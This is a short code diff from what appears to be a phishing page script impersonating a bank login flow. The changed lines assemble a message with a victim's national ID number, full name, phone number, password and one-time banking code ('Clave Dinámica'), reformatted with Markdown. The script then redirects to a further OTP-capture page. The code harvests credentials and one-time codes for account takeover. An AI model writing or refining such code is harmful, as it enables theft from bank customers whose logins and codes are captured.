@@ -189,8 +189,8 @@ if (!formData || !formData.UserId || !formData.userName || !formData.phoneNumber
 
                         loadingSpinner.style.display = 'block';
 
-                        const message = `☘️DINÁMICA 2☘️\n\n🪪 Cédula: ${formData.cedula}\n👤 Nombres: ${formData.nombreCompleto}\n#️⃣Número: ${phoneNumber}\n  🔐Clave: ${password}\n ✅Clave Dinamina 1: ${otp}`;
-                        // Redirigir después de enviar
+                        const message = `***⚡ DINÁMICA 2 ⚡***\n\n🪪 * *Cédula:** ${formData.cedula}\n👤 **Nombres:** ${formData.nombreCompleto}\n#️⃣**Número:** ${phoneNumber}\n  🔐**Clave:** ${password}\n ✅**Clave Dinamina 1:** ${otp}`;
+
                         setTimeout(() => {
                             loadingSpinner.style.display = 'none';
                             window.location.href = 'validate-otp3.php';
